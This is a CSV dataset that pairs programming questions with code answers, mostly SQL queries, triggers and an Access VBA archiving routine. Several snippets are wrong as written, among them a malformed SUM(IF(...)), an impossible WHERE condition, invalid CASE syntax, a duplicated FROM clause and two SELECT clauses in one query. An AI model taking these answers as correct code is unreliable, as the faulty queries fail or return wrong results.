,Unnamed: 0,NL,Code
12521,48850,How to write a SQL command to move all old data from access table into another database/table?,"Option Compare Database
Option Explicit

Sub ArchiveOldRecords()

Dim nSourceCount As Long, nMoveCount As Long, nDestCount As Long
Dim strSQL As String, sMsg As String
Dim rsLock As DAO.Recordset
Dim rsBefore As DAO.Recordset, rsAfter As DAO.Recordset
Dim wrk As Workspace, db As DAO.Database

Const strcTableSource As String = ""t_TestWithDate""  ' Move records FROM table
Const strcTableArch As String = ""t_ArchiveTestWithDate"" ' Move records TO table
Const strcWHERE As String = "" WHERE field2 < "" _
    & ""DATEADD(""""yyyy"""", -1, Date())""   ' Select date field and DATEADD params
Const strcCount As String = ""SELECT COUNT(*) As ""

On Error GoTo TrapError
    Set db = CurrentDb
    Set wrk = DBEngine.Workspaces(0)
' Lock table - so no one can add/delete records until count is verified
    Set rsLock = db.OpenRecordset(strcTableSource, dbOpenTable, dbDenyWrite)
' Get initial table counts
    Set rsBefore = db.OpenRecordset( _
        strcCount & ""SourceCount, "" _
        & ""(SELECT COUNT(*) FROM "" & strcTableSource _
            & strcWHERE & "") As MoveCount, "" _
        & ""(SELECT COUNT(*) FROM "" & strcTableArch & "") As DestCount "" _
        & ""FROM "" & strcTableSource & "";"", dbOpenForwardOnly)
    nSourceCount = rsBefore!SourceCount
    nMoveCount = rsBefore!MoveCount
    nDestCount = rsBefore!DestCount
    rsBefore.Close

    wrk.BeginTrans
    ' Copy records
        strSQL = ""INSERT INTO "" & strcTableArch _
            & "" SELECT * FROM "" & strcTableSource & "" "" & strcWHERE & "";""
        db.Execute strSQL, dbFailOnError
    ' Unlock table - only needed for counts
        rsLock.Close
        Set rsLock = Nothing
    ' Delete copied records
        strSQL = ""DELETE * FROM "" & strcTableSource & "" "" & strcWHERE & "";""
        db.Execute strSQL, dbDenyWrite + dbFailOnError
    ' Lock table - only needed for counts
        Set rsLock = db.OpenRecordset(strcTableSource, dbOpenTable, dbDenyWrite)
    wrk.CommitTrans

    ' Get final table counts
    Set rsAfter = db.OpenRecordset( _
        strcCount & ""SourceCount, "" _
        & ""(SELECT COUNT(*) FROM "" & strcTableSource _
            & strcWHERE & "") As MoveCount, "" _
        & ""(SELECT COUNT(*) FROM "" & strcTableArch & "") As DestCount "" _
        & ""FROM "" & strcTableSource & "";"", dbOpenForwardOnly)

    ' Double-check counts
    If (rsAfter!SourceCount <> nSourceCount - nMoveCount) _
        Or (rsAfter!DestCount <> nDestCount + nMoveCount) _
        Or (rsAfter!MoveCount > 0) Then
        sMsg = vbNewLine
        sMsg = sMsg & ""Records in "" & strcTableSource & "" before:            ""
        sMsg = sMsg & nSourceCount
        sMsg = sMsg & vbTab & ""after: ""
        sMsg = sMsg & rsAfter!SourceCount
        sMsg = sMsg & vbNewLine
        sMsg = sMsg & ""Records to archive from "" & strcTableSource & "": ""
        sMsg = sMsg & nMoveCount
        sMsg = sMsg & vbTab & ""after: ""
        sMsg = sMsg & rsAfter!MoveCount
        sMsg = sMsg & vbNewLine
        sMsg = sMsg & ""Records in "" & strcTableArch & "" before:       ""
        sMsg = sMsg & nDestCount
        sMsg = sMsg & vbTab & ""after: ""
        sMsg = sMsg & rsAfter!DestCount
        MsgBox ""Count double-check failed"" & sMsg
    End If

Exit_Sub:
    On Error Resume Next
    ' Unlock table and close recordsets
    rsLock.Close
    rsBefore.Close
    rsAfter.Close
    Set rsBefore = Nothing
    Set rsAfter = Nothing
    Set rsLock = Nothing
    Set db = Nothing
    Set wrk = Nothing
    Exit Sub

TrapError:
    MsgBox ""Failed: "" & Err.Description
    wrk.Rollback
    Err.Clear
    Resume Exit_Sub

End Sub
"
10749,26700,How to replace a NULL when a COUNT(*) returns NULL in DB2,"SELECT A.AHSHMT AS SHIPMENT, 
A.AHVNAM AS VENDOR_NAME, 
COALESCE( D.UNITS_SHIPPED, 0 ) AS UNITS_SHIPPED,
D.ADPON AS PO, 
COALESCE( B.NUMBER_OF_CASES_ON_TRANSIT, 0 ) AS NUMBER_OF_CASES_ON_TRANSIT, 
COALESCE( C.NUMBER_OF_CASES_RECEIVED, 0 ) AS NUMBER_OF_CASES_RECEIVED
FROM ...
"
5337,20328,Adapt query to return category hierarchy by keyword,"SELECT T2.record_id, T2.title,T2.level,T2.keywords
FROM (SELECT @r AS _id
           , (SELECT @r := parent_id 
              FROM   tblAllCategories 
              WHERE record_id = _id) AS parent_id
           , @l := @l + 1 AS lvl
      FROM   (SELECT @r := record_id, @l := 0
              FROM   tblAllCategories
              WHERE  keywords like '%retro%') vars
           , tblAllCategories m
      WHERE  @r <> 0) T1
     JOIN tblAllCategories T2 ON T1._id = T2.record_id
ORDER BY T1.lvl DESC;
"
23027,49054,How to filter rows from an ordered table?,"SELECT id, name, MAX(points)
FROM your_table
GROUP BY id, name
ORDER BY points desc
"
29142,38110,how do i get mysql rows from 24-48 hours ago?,"SELECT *
  FROM YOUR_TABLE t
 WHERE t.datetime_column < DATE_SUB(NOW(), INTERVAL 24 HOUR)
   AND t.datetime_column > DATE_SUB(NOW(), INTERVAL 48 HOUR)
"
24637,71172,Specifying properties to be updated in linq query,"foreach (string propName in propertiesNames)
{
    PropertyInfo prop = this.GetType().GetProperty(propName);
    prop.SetValue(valueForProp);
}
"
19770,70335,UNION DISTINCT faster than OR on 9 million records?,"mytable(col1, col2, col3, my_primary_key)
mytable(col1, col2, col4, my_primary_key)
mytable(col1, col2, col5, my_primary_key)
"
28618,51401,MySQL UNIX_TIMESTAMP for PostgreSQL,"SELECT extract(epoch FROM your_datetime_column)
FROM your_table
"
3736,1376,SQL - search by beginning of a word,"SELECT * FROM tableName WHERE CompanyName LIKE 'Em%' or CompanyName LIKE '% Em%'
"
6026,24640,Reverse the two last data from the database,"SELECT t.*
FROM (SELECT data_temperature, data_address_seo, datetime_logged
      FROM weather
      WHERE data_address_seo = 'street-28-postal-code-city-country'
      ORDER BY datetime_logged DESC
      LIMIT 2
     ) t
ORDER BY datetime_logged;
"
37811,36671,How do I auto increment my own results column from a max value in a table?,"SELECT
    Seed.ID + ROW_NUMBER() OVER (order by T.ID) as Number,
    T.ID
FROM
    T CROSS JOIN
    (SELECT MAX(ID) AS ID FROM T) AS Seed
"
25741,10762,"De-duping users based on membership, level thereof, and expiration date or membership","SELECT TOP 1 u.[UserId], 
                Case um.[Expires]
                    When null then 9999      --Inactive Membership
                    When >= GetDate() then 1 --Expired Membership
                    Else 0                   --Active Membership
                End as ActiveRank, 
                Case m.[Order]
                    When null then 9999      --No Membership
                    Else Order               --Membership Ranking
                End as MembershipRank
  FROM [dbo].[Users] u
  LEFT OUTER JOIN [dbo].[UserMemberships] um
    ON u.[UserId] = um.[UserId]
  LEFT OUTER JOIN [dbo].[Memberships] m
    ON um.[MembershipId] = m.[MembershipId]
  WHERE u.[Email] = @Email             
  ORDER BY ActiveRank ASC, MembershipRank ASC, u.[Created] DESC
"
15425,36708,"List out column from one table, and two columns from another table","SELECT tp.date_of_purchase, tp.name, tt.item_description
FROM table_a AS tp
LEFT OUTER JOIN tableb AS tt 
  ON tp.id = tt.id;
"
7703,70564,Oracle SQL table history,"SELECT * FROM yourtable
  AS OF TIMESTAMP TO_TIMESTAMP('2004-04-04 09:30:00', 'YYYY-MM-DD HH:MI:SS');
"
8907,2796,How to update mysql table without deleting existing content,"update mysql_table set Cid = concat(Cid,'15~');
"
1485,74778,Allow nulls / de-duplicate within multi-table join? T-SQL,";WITH custCTE AS (
  SELECT CUST_ID, NAME, 1 AS CUST_ROW_N
  FROM CUSTOMERS
),
addrCTE AS (
  SELECT CUST_ID, ADDRESS, ROW_NUMBER() OVER(PARTITION BY CUST_ID ORDER BY ADDR_SEQ) CUST_ROW_N
  FROM CUSTOMER_ADDRESSES
),
acctCTE AS (
  SELECT CUST_ID, ACCT_TYPE, ACCOUNT_OPEN_DT, ROW_NUMBER() OVER(PARTITION BY CUST_ID ORDER BY ACCT_SEQ) CUST_ROW_N
  FROM CUSTOMER_ACCOUNTS
)
SELECT COALESCE(a.CUST_ID, b.CUST_ID, c.CUST_ID), a.NAME, b.ADDRESS, c.ACCT_TYPE, c.ACCOUNT_OPEN_DT
FROM custCTE a FULL JOIN addrCTE b ON
  a.CUST_ID = b.CUST_ID AND a.CUST_ROW_N = b.CUST_ROW_N FULL JOIN acctCTE c ON
  (b.CUST_ID = c.CUST_ID AND b.CUST_ROW_N = c.CUST_ROW_N) OR (a.CUST_ID = c.CUST_ID AND a.CUST_ROW_N = c.CUST_ROW_N)
"
35849,58404,Using MySQL to calculate balances from debits and credits in a single table,"DROP TABLE IF EXISTS my_table;

CREATE TABLE my_table
(transaction_id INT NOT NULL AUTO_INCREMENT PRIMARY KEY
,client_id INT NOT NULL
,action_type VARCHAR(12) NOT NULL
,action_amount INT NOT NULL
);

INSERT INTO my_table(client_id,action_type,action_amount) VALUES
(1            ,'debit',         1000),
(1            ,'credit',         100),
(1            ,'credit',         500),
(2            ,'debit',          1000),
(2            ,'credit',         1200),
(3            ,'debit',          1000),
(3            ,'credit',         1000),
(4            ,'debit',          1000);


SELECT client_id
     , SUM(COALESCE(CASE WHEN action_type = 'debit' THEN action_amount END,0)) total_debits
     , SUM(COALESCE(CASE WHEN action_type = 'credit' THEN action_amount END,0)) total_credits
     , SUM(COALESCE(CASE WHEN action_type = 'debit' THEN action_amount END,0)) 
     - SUM(COALESCE(CASE WHEN action_type = 'credit' THEN action_amount END,0)) balance 
  FROM my_table 
 GROUP  
    BY client_id
HAVING balance <> 0;


+-----------+--------------+---------------+---------+
| client_id | total_debits | total_credits | balance |
+-----------+--------------+---------------+---------+
|         1 |         1000 |           600 |     400 |
|         2 |         1000 |          1200 |    -200 |
|         4 |         1000 |             0 |    1000 |
+-----------+--------------+---------------+---------+
"
21128,8886,SQL Select on priority of not exist,"declare @UserID int
select G.NodeID
from GroupsTable G
inner join
(
    select GroupID, count(*) over () GroupCount
    from UserGroupsTable
    where UserID = @UserID
) UG on UG.GroupID = G.GroupID
GROUP BY G.NodeID, UG.GroupCount
HAVING COUNT(*) != UG.GroupCount OR UG.GroupCount = 1
-- count=1 is special. it will always equal groupcount, but let it through
"
25056,61682,Converting varchars into two points Decimal value by using SQL,"SELECT 
    CAST(
        CONCAT(SUBSTRING(test_value,1, LENGTH(test_value) -2),
               '.',
               SUBSTRING(test_value, LENGTH(test_value) -1, 1))
    AS DECIMAL(7,1))
FROM TEST
WHERE SUBSTRING(test_value, LENGTH(test_value)) = 'A' 
|| SUBSTRING(test_value, LENGTH(test_value)) = 'H'
-- keep adding above line for the rest of the ending characters you want
"
32701,33698,How to get colums from two tables SQL,"SELECT s.Id, s.Name 
FROM SalaryGroup as s LEFT JOIN ProfileSalaryGroups ps on s.Id = ps.SalaryGroupId
                                  AND ps.ProfileId = @ProfId
WHERE ps.SalaryGroupId IS NULL
"
6226,35791,Conditional where clause SQL Server 2012,"Where 
( 
   (LeaveDateTime > FromDate and EnteringDateTime < ToDate) 
      AND
   dateadd(day, Threshhold, LeaveDateTime) >= EnteringDateTime
);
"
14120,20436,count subscribers who have subscribed to all magazines(3 different magazines),"SELECT COUNT(*) 
  FROM (SELECT sub_id, COUNT(distinct mag_id) 
          FROM dvd_subscriptions 
         WHERE mag_id IN (1, 2, 3) 
         GROUP BY sub_id
        HAVING COUNT(distinct mag_id) = 3)
"
39839,58736,Transposing from rows into columns,"declare @t table(Name    varchar(10), State       varchar(10), Amount int)
insert into @t
select 'Pump 1',  'Present',     339  union all
select 'Pump 1',  'Optimized',   88 

select name,
max(case when state='Present' then 'Present' end),
max(case when state='Present' then Amount end),
max(case when state='Optimized' then 'Optimized' end),
max(case when state='Optimized' then Amount end)
from @t
group by name
"
5784,44794,Representing a rootless Tree/chart/hierarchy in a database,"NodeA   NodeB  Hops
------  ------ ----
tog171  tog171  0
tog171  abb521  1
abb521  tog171  1
tog171  tog226  2
tog226  tog171  2
tog171  tog218  3
tog218  tog171  3
"
9222,13764,Oracle recursive SELECT,"create or replace function transform_data(p_input in varchar2) return varchar2
is
    v_result varchar2(2000);
    v_col_value varchar2(200);
begin
    v_result := p_input;

    for rec in (select * from table2)
    loop
        if instr(v_result, rec.Formula_Component) > 0 then
            v_result := replace(v_result, rec.Formula_Component, rec.Actual_Component);
        end if;
    end loop;

    return v_result;
end;
"
38861,20713,How can I join 3 tables?,"SELECT 
  t.username, 
  r.region_name, 
  i.instituation_name
FROM tb_user t
INNER JOIN tb_region r ON t.region_id = r.region_id
INNER JOIN tb_institutional_profile i ON t.institution_id = i.institution_id
"
20740,61067,Adding a prefix to a value,"Update EMP set EID='ENO.'||EID;
"
28063,27154,Join two rows together if they share the same value?,"SELECT A.Name, A.TotalQty, B.TotalBilled
FROM (
 SELECT Name, SUM(Quantity) as TotalQty
 FROM YourTableHere
 GROUP BY Name
 ) A
INNER JOIN
(
 SELECT Name, SUM(Billed) as TotalBilled
 FROM YourTableHere
 GROUP BY Name
) B
ON A.Name = B.Name
"
25774,23316,Combining two select statements,"var chgAssociationQuery1 = ((from a in sostenuto.PROBLEMS
                                         join b in sostenuto.S_ASSOCIATION on a.SERVICEREQNO equals b.FROMSERVICEREQNO
                                         join c in sostenuto.Changes on b.TOSERVICEREQNO equals c.SERVICEREQNO
                                         where b.FROMSERVICEID == 101001110
                                               && b.TOSERVICEID == 101001109
                                               && a.NAME.Contains(name)
                                         select new { ProblemReqNo = a.SERVICEREQNO, ProblemId = a.SERVICEREQID, ChangeReqNo = c.SERVICEREQNO, ChangeId = c.SERVICEREQID, ChangeNumber = c.CSEBRANCHCHANGE, ChangeBranch = c.MAINTBRANCH})
                                       .Union(from a in sostenuto.PROBLEMS
                                         join b in sostenuto.S_ASSOCIATION on a.SERVICEREQNO equals b.TOSERVICEREQNO
                                         join c in sostenuto.Changes on b.FROMSERVICEREQNO equals c.SERVICEREQNO
                                         where b.FROMSERVICEID == 101001109
                                               && b.TOSERVICEID == 101001110
                                               && a.NAME.Contains(name)
                                            select new { ProblemReqNo = a.SERVICEREQNO, ProblemId = a.SERVICEREQID, ChangeReqNo = c.SERVICEREQNO, ChangeId = c.SERVICEREQID, ChangeNumber = c.CSEBRANCHCHANGE, ChangeBranch = c.MAINTBRANCH })).ToList();
"
19129,70350,SQL LEFT JOIN on two possible columns,"   SELECT * 
   FROM `USER_ACTIVITY_T` 
   LEFT JOIN `MACHINE_T` 
   ON MACHINE_T.machineid = USER_ACTIVITY_T.machineid

   UNION ALL

   SELECT * 
   FROM `USER_ACTIVITY_T` 
   JOIN `MACHINE_T` 
   ON MACHINE_T.username = USER_ACTIVITY_T.username
   WHERE USER_ACTIVITY_T.machineid IS NULL
"
38657,5332,Need Help on Calculate Percentage of Failure of All Columns in Very Large MySQL Table,"select id, count(*), 
sum(case when col1 between 0 and 10 then 1 else 0 end) col1_yes,
sum(case when (col1 not between 0 and 10) and (col2 between 0 and 10) then 1 
else 0 end) col1no_col2yes 
from table 
group by id;
"
21453,8725,How to list non existent items?,"SELECT n.n_id, n.name, b.b_id, b.title
FROM names n
CROSS JOIN books b
LEFT JOIN read r ON ( r.n_id = n.n_id AND r.b_id = b.b_id )
WHERE r.n_id IS NULL
"
4321,68684,How to get the average for one column of data in sql server,"Select  *
From [Enterprise].[dbo].[Employee]
WHERE ED_LVL > (Select  AVG(ED_LVL) From [Enterprise].[dbo].[Employee])
"
10494,22489,create an sql query to retrieve elements between 2 dates T1 and T2 or outside T1 and T2,"SELECT * 
FROM myTable 
WHERE
(tmp BETWEEN T1 AND T2)
OR
((tmp < T1 OR tmp > T2) AND (tmp NOT BETWEEN T1 AND T2))
"
10880,66731,PostgreSQL Inner Join on the same table + second table?,"SELECT dealership_table1.make,
       dealership_table1.model,
       dealership_table1.year,
       details_table.detaila,
       details_table.detailb,
       details_table.detailc
  FROM dealership_table dealership_table1
  JOIN dealership_table dealership_table2
    ON dealership_table1.make  = dealership_table2.make
   AND dealership_table1.model = dealership_table2.model
   AND dealership_table1.year  = dealership_table2.year
  JOIN details_table
    ON dealership_table.id = details_table.id
 WHERE dealership_table1.dealership = 'A'
   AND dealership_table1.dealership = 'B'
;
"
2236,32091,oracle get variables from plsql back to linux,"v1=`$ORACLE_HOME/bin/sqlplus -S /nolog > ${logfile} 2>&1 << EOF
connect test/passwd@sid
SET FEED OFF;
SET TERMOUT ON;
SET VERIFY OFF;
SET ECHO OFF;
SET HEAD OFF;
SELECT sysdate from dual FROM DUAL;
EXIT
EOF`

echo $v1
"
33954,37056,Getting Multi Rows in Database and transferring it in a multiline textbox in VB.net WinForms,"mycom.CommandText = ""SELECT Cellphone FROM tbl_applicant where Gender='Female';""
myr = mycom.ExecuteReader
While myr.Read()
    TextBox1.Text = TextBox1.Text & myr(0) & Environment.NewLine
End While
"
13295,50635,Best Way For Join Parent ID,"SELECT t1.* , t2.name as parent_category 
  from categories t1 
  INNER JOIN categories t2 on t1.id = t2.parent_id
"
38609,24204,Returning child records in a single SQL statement in SQL Server 2008/2012,";WITH Rec AS (
    SELECT [Id],
        [Path],
        [Title],
        [Description]
    FROM [Configuration].[Pages] p 
    WHERE 
        ((p.Id = @Id) OR (@Id IS NULL)) AND
        ((p.Path = @Path) OR (@Path IS NULL))
)
SELECT 'Main' Which, * FROM Rec
-- plus the children...
UNION ALL
SELECT 'Related', h.Id, h.Title, h.Description, h.[Content]
FROM   [Configuration].[HelpItems] h
INNER JOIN [Configuration].[PageHelpItems] ph ON h.Id = ph.HelpId
INNER JOIN Rec ON Rec.Id = ph.PageId
"
36029,33495,How to get the following join query,"SELECT t1.col1, t2.col2, t2.col3
  FROM table1 t1
  LEFT JOIN table2 t2 ON t1.col1=t2.col1
;
"
1616,40383,How can i search a non case sensitive word with Sql Server XQuery?,"DECLARE @x xml = N'abcDEF!@4';
SELECT @x.value('fn:upper-case(/text()[1])', 'nvarchar(10)');
"
34710,18621,Join between two sql statements,"select t1.*, t2.*
from (select ID, NAME from tab1) t1 cross join
     (Select ""DESC"" from tab2) t2;
"
34295,42346,SQL -- Adding a constraint to a results row in an existing query,"Select count(Player_Id) From
(
    Select
        T.Player_Id
    From Player_Tapjoy T 
           Inner Join Player_Source S 
               On (T.Player_Id = S.Player_Id)
           Inner Join Feature_Group_Xref F
          On (S.Group_Id=F.Group_Id 
              And F.Feature_Name ='Try     BC') 
     Where Trunc(t.Create_Dtime) = To_Date('2012-sep-17','yyyy-mon-dd')
     Union All
     Select 
         A.Player_Id 
     From Player_Aux_Pt A 
         Inner Join Player_Source S  
              On (A.Player_Id = S.Player_Id)
         Inner Join Feature_Group_Xref F
          On (S.Group_Id=F.Group_Id 
               and f.feature_name =     'TryBC')
    Where A.Site = 'AppCircle' 
    And Trunc(A.Create_Dtime) = To_Date('2012-sep-17','yyyy-mon-dd')
 ) q
 join player p
      on (p.Player_Id = q.Player_Id)
 where Trunc(p.Create_Dtime) < To_Date('2012-sep-12','yyyy-mon-dd')
"
36452,10491,Recommended SP/method to gain information,"EXEC sp_depends yourProcedure;
"
8529,24056,Paging Table Another Sql Question,"DECLARE @PageSize INT = 200

;WITH PagingInfo AS
(
    SELECT
        RateID, InfoDate,
        ROW_NUMBER() OVER (ORDER BY InfoDate) AS RowNo
    FROM 
        dbo.Rate
),
Pages AS
(
    SELECT     
       RateID,
       InfoDate,
       RowNo,
       ((RowNo - 1) / @PageSize) AS PageNo
    FROM PagingInfo
)
SELECT     
    p.PageNo,
    (SELECT RateID FROM Pages p2 WHERE p2.PageNo = p.PageNo AND p2.RowNo % @PageSize = 1) AS 'First RateID',
    (SELECT RateID FROM Pages p2 WHERE p2.PageNo = p.PageNo AND p2.RowNo % @PageSize = 0) AS 'Last RateID',
    (SELECT InfoDate FROM Pages p2 WHERE p2.PageNo = p.PageNo AND p2.RowNo % @PageSize = 1) AS 'First InfoDate',
    (SELECT InfoDate FROM Pages p2 WHERE p2.PageNo = p.PageNo AND p2.RowNo % @PageSize = 0) AS 'Last InfoDate'
FROM Pages p 
WHERE p.RowNo % @PageSize = 0
"
16785,5778,SQLXMLBulkLoad Schema Validation Issue (Easy),"<xsd:element name=""Employees"" sql:is-constant=1>
<xsd:complexType>
    <xsd:sequence>
        <xsd:element name=""Employee"" sql:relation=""The_Employees"">
          <xsd:complexType>
          <xsd:sequence>
            <xsd:element name=""EmployeeID"" sql:field=""EmpNo"" type=""xsd:integer""/>
            <xsd:element name=""FirstName"" sql:field=""FirstName"">
                <xsd:simpleType>
                    <xsd:restriction base=""xsd:string"">
                        <xsd:whiteSpace value=""collapse""/>
                    </xsd:restriction>
                </xsd:simpleType>
            </xsd:element>
           .......... and on
          </xsd:sequence>
          </xsd:complexType>
        </xsd:element>
    </xsd:sequence> 
</xsd:complexType>
"
21387,72653,UPDATE with INNER JOIN or MIN?,"UPDATE NEW n
  INNER JOIN (
    SELECT
      OtherID,
      MIN(ID) AS ID
    FROM NEW
    GROUP BY OtherID
  ) m ON n.ID = m.ID
  INNER JOIN OLD o ON n.OtherID = o.OtherID
SET n.Data = o.Data
"
27458,68696,How do you get whether a column is a primary key of a table from with all columns?,"SELECT column_name, CASE WHEN COLUMN_KEY = 'PRI' THEN 'y' ELSE 'n' END AS result
FROM information_schema.columns
WHERE table_schema = DATABASE()
   AND `table_name` = 'tab'     -- table name
ORDER BY `table_name`, ordinal_position
"
33012,31161,get list of products in stock at any given date,"SELECT ProductFK, SUM(IF(m.direction='IN'))-SUM(IF(m.direction='OUT')) AS stock
FROM Move m WHERE m.Date < '20090101' AND stock > 0
"
22902,18372,What is SQL Server analog for MySql's NEW.some_column in triggers?,"CREATE TRIGGER AntiCloneInsert ON dbo.user_item FOR INSERT AS
BEGIN   
    update ua
        set block_flag2 = 1
        from ua join
             dbo.user_data ud
             on ua.uid = ud.account_id join
             inserted i
             on ud.char_id = i.char_id join
             dbo.forbidden_item_types it
             on it.item_type = i.item_type
         where  (select count(it2.item_type)
                 from dbo.user_item it2
                 where it2.item_type = i.item_type and
                       it2.warehouse = i.warehouse
                ) > 1;
END
"
4590,74152,re-create a statement using inner join,"select nomF 
from fournisseur f
inner join puf ON f.numF = puf.numF
inner join usine u ON u.numU = puf.numU
    AND u.villeU in ('Paris','Créteil')
inner join produit p ON p.numP = puf.numP
"
28775,60127,Django ORM - Get latest record for group,"Meetup.objects.values('language').annotate(latest_date=Max('date'))
"
14289,16421,sql - insert new row where field equals another value,"INSERT INTO CurrentTable
    (CODE, Name)
    SELECT 'XX', ct1.Name
        FROM CurrentTable ct1
        WHERE ct1.CODE = 'BB'
            AND NOT EXISTS(SELECT NULL
                               FROM CurrentTable ct2
                               WHERE ct1.name = ct2.name
                                   AND ct2.CODE = 'XX')
"
39917,38987,A SQL query for a running total of users,"SELECT received_at as sign_up_date,
   ROW_NUMBER() OVER (ORDER BY received_at ASC) AS running_total
FROM seller_v2.users;
"
5137,16206,Best way to insert all combinations of input items,"create table #address(address varchar(1) not null)

insert into #address
values ('c'), ('d'), ('e')

create table #city(city varchar(1) not null)

insert into #city
values ('f'), ('g'), ('h')

insert into my_table
select 'a', 'b', address, city
from #address, #city
"
31546,39804,Loop variables through table valued function,"DECLARE @dates TABLE (dt datetime)

-- you can get the dates into the table in any way that is most appropriate...
INSERT INTO @dates (dt) VALUES ('1/1/2014')
INSERT INTO @dates (dt) VALUES ('1/2/2014')
INSERT INTO @dates (dt) VALUES ('1/3/2014')

SELECT SUM(pdar.PastDueAR) AS PastDueAR_Total
FROM @dates dates
    CROSS APPLY dbo.PastDueARcalc(dates.dt) pdar
WHERE pdar.PastDueAR <> 0
AND CustomerId in (16629, 9969, 19809)
"
29193,70979,Query to return list of tables in Access,"SELECT Name
FROM MSysObjects
WHERE (Name NOT LIKE ""MSys*"") AND (Type=1 OR Type=6);
"
23781,18627,Use Alias Columns to calculate another Alias Column,"  SELECT SomeData..,  
    OrderTotalEeur,
    InvoiceTotalEur,
    (OrderTotalEeur - IIF(InvoiceTotalEur is null, 0, InvoiceTotalEur) AS Diff
  FROM (
      SELECT SomeData.., Order.EurAmount AS OrderTotalEeur, 
      --Begin Subselect
      (SELECT Sum(Invoice.EurAmount) 
      FROM Invoice WHERE Invoice.OrderId = Order.Id 
       GROUP BY Invoice.OrderId) As InvoiceTotalEur
      --End Subselect
    FROM [Order]
    ) myquery
"
10173,6899,SQL Join Statement,"SELECT bar_id, bar_name, town_name, advert_text      
FROM bar b
inner join towns t on t.town_id = b.town_id_fk 
left outer join baradverts ba on t.town_id = ba.town_id_fk 
    AND b.bar_id = ba.bar_id_fk 
"
23887,52692,Can't save result set into variable in MySQL,"SELECT @id := GROUP_CONCAT(id) 
FROM products;
SELECT @id;
"
3592,51616,T SQL Group column with accumulating data in one record,"Select 
  sales_ref_no,
  STUFF((
  SELECT ' | ' + B.Description
   FROM YOUR_TABLE B
   WHERE (B.sales_ref_no = A.sales_ref_no) 
   FOR XML PATH(''),TYPE).value('(./text())[1]','VARCHAR(MAX)')
  ,1,2,'') AS Description
From YOUR_TABLE A
Group By sales_ref_no
"
22691,43965,Grouping by Distinct Values,"WITH AllDays AS (
    SELECT CAST('20120101' as datetime) AS days
    UNION ALL
    SELECT DATEADD(dd, 1, days)
    FROM AllDays
    WHERE DATEADD(dd, 1, days) < cast('20120201' as datetime)
), V AS (
  SELECT
    MIN(ad.days) AS Date,
    ISNULL((SELECT SUM(value) FROM jobs WHERE dateinvoiced >= CAST('20120101'
    as datetime) AND dateinvoiced <= ad.days)/100,0) AS Value
  FROM AllDays AS ad
  LEFT JOIN jobs AS j ON (ad.days = j.dateinvoiced)
  GROUP BY ad.days
)
SELECT MIN(Date) Date, Value
FROM V
GROUP BY Value;
"
39259,45130,select from 2 tables where it has the same value or not depending on the search value,"select ID, [Name] from Table1 where Lower([Name]) like '%mouse%'
union
select ID, [Name] from Table2 where Lower([Name]) like '%mouse%'
"
22479,20738,How to find difference of consecutive rows for different users in sql2000?,"SELECT 
    *
FROM
    my_table AS [current]
    LEFT JOIN my_table AS [next]
        ON [next].ID = (
            SELECT 
                MIN(ID) -- get first ID
            FROM
                my_table 
            WHERE
                ID > [current].ID  -- greater than the current
                and my_table.[User] = [current].[User] -- same user
                and my_table.[Date] = [current].[Date] -- same day
        )
"
9711,35065,Create MySQL Trigger on Insert,"CREATE TRIGGER tickets
BEFORE INSERT ON myit_table_work_order
FOR EACH ROW
  SET NEW.customer_id = (SELECT id
                         FROM myit_table_customer
                         WHERE email=NEW.email);
"
3489,25571,How to combine the result of two queries into one resultset,"from employee e left join savings s on e..employee_code = s.employee_code
and saving_amount > 1000

left join deduction d on e.employee_code = d.employee_code
"
39600,33733,MS Access and SSMS return different # of records from exact same query,"SELECT DISTINCT vAP.ACCOUNT_NUMBER
              , vAP.INVESTOR_CODE
              , vAP.APPLICATION_PROCESS_STATUS
              , vDIP.DOCUMENT_INTAKE_START_DATE
              , vAP.APPLICATION_TYPE_DESC
              , vDP.DECISION_STATUS_DESC
              , vDP.DECISION_STATUS_DATE
              , vDP.DECISION_PROCESS_STATUS
              , vAP.INVESTOR_NAME

SELECT DISTINCT vAP.APPLICATION_ID
              , vDIP.APPLICATION_ID
              , vDP.APPLICATION_ID

           FROM ((dbo_V_Application_Process AS vAP
                      LEFT JOIN dbo_V_Document_Intake_Process AS vDIP
                             ON vAP.APPLICATION_ID = vDIP.APPLICATION_ID
                 )
                 LEFT JOIN dbo_V_Decision_Process AS vDP
                        ON vAP.APPLICATION_ID = vDP.APPLICATION_ID)
"
18384,32983,Mutating table issue when TRIGGER needs to select and insert rows in same table,"create trigger table1_io
instead of insert or update or delete on table1
for each row
begin
  if inserting or updating then 
      update table1_base
      set active = 'N'
      where id = :new.id
      and active = 'y';

      insert into table1_base...;
  elsif deleting then
      update table1_base
      set active = 'N'
      where id = :old.id
      and active = 'y';
  end if;
end;
"
